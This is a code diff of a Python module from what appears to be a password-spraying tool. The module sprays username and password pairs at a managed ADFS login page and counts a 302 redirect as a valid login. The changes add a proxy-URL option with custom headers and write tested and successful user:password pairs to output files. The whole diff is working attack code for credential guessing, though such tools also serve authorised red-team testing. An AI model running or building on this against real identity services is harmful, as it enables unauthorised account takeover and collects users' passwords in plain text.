@@ -15,10 +15,10 @@ from core.colors import text_colors
 from core.defaults import *
 from requests.auth import HTTPBasicAuth
 
-class ASModule(object):
+class OmniModule(object):
 
-    # Storage for successful results of each task
-    successful_results = []
+    # Counter for successful results of each task
+    successful_results = 0
 
     def __init__(self, *args, **kwargs):
         self.type     = "spray"
@@ -31,19 +31,19 @@ class ASModule(object):
         self.proxies  = None if not self.args.proxy else {
             "http": self.args.proxy, "https": self.args.proxy
         }
-        # Open file handles for logging and writing test cases
-        self.log_file    = ThreadWriter(LOG_FILE, kwargs['log_dir'])
-        self.tested_file = ThreadWriter("tested.txt", kwargs['log_dir'])
         # Globally track users being sprayed so we can remove users
         # as needed
         self.users = []
+        # Open file handles for writing test/success cases
+        self.tested_file  = ThreadWriter(SPRAY_TESTED, self.out_dir)
+        self.success_file = ThreadWriter(SPRAY_FILE, self.out_dir)
 
     def shutdown(self, key=False):
         ''' Perform a shutdown and clean up of the asynchronous handler '''
         print()  # Print empty line
         if key:
             logging.warning("CTRL-C caught...")
-        logging.info(f"Writing results to: '{self.out_dir}'")
+        logging.info(f"Results can be found in: '{self.out_dir}'")
 
         # https://stackoverflow.com/a/48351410
         # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
@@ -53,14 +53,12 @@ class ASModule(object):
         atexit.unregister(concurrent.futures.thread._python_exit)
         self.executor.shutdown = lambda wait:None
 
-        # Write the successful results
-        logging.info(f"Valid credentials: {len(self.successful_results)}")
-        with open(f"{self.out_dir}{SPRAY_FILE}", 'a') as f:
-            write_data(self.successful_results, f)
+        # Let the user know the number of valid credentials identified
+        logging.info(f"Valid credentials: {self.successful_results}")
 
         # Close the open file handles
-        self.log_file.close()
         self.tested_file.close()
+        self.success_file.close()
 
     async def run(self, password):
         ''' Asyncronously execute task(s) '''
@@ -78,7 +76,8 @@ class ASModule(object):
     def prechecks(self):
         ''' Perform module prechecks to validate certain data is set
             via command line args. '''
-        if not self.args.url:
+        # If --url not provided, check if --proxy-url was provided
+        if not self.args.url and not self.args.proxy_url:
             logging.error("Missing module arguments: --url")
             return False
 
@@ -97,6 +96,10 @@ class ASModule(object):
             ''' Spray users via a managed ADFS server
                 https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py '''
 
+            # Write the tested user in its original format with the password
+            # via: user:password
+            self.tested_file.write(f"{user}:{password}")
+
             custom_headers = HTTP_HEADERS
 
             # Build/validate email
@@ -108,22 +111,34 @@ class ASModule(object):
                 self.users.remove(user)
                 return
 
-            url = self.args.url
-
-            # Keep track of tested names in case we ctrl-c
+            # Build user:password var for reuse with spacing
             creds = f"{user}:{password}"
-            self.tested_file.write(creds)
+
+            # Handle the --proxy-url flag
+            # All URL paths and parameters required are assumed to be appended by the
+            # user via the --url or --proxy-url flag.
+            if self.args.proxy_url:
+                url = self.args.proxy_url
+
+                if self.args.proxy_headers:
+                    for header in self.args.proxy_headers:
+                        header = header.split(':')
+                        custom_headers[header[0].strip()] = ':'.join(header[1:]).strip()
+
+            else:
+                url  = self.args.url
 
             data     = f"UserName={user}&Password={password}&AuthMethod=FormsAuthentication"
             response = self._send_request(requests.post,
                                           url,
                                           data=data,
-                                          headers=headers)
+                                          headers=custom_headers)
 
             r_status = response.status_code
 
             if r_status == 302:
-                self.successful_results.append(creds)
+                self.successful_results += 1
+                self.success_file.write(creds)
                 logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}:{password}")
                 self.users.remove(user)
 
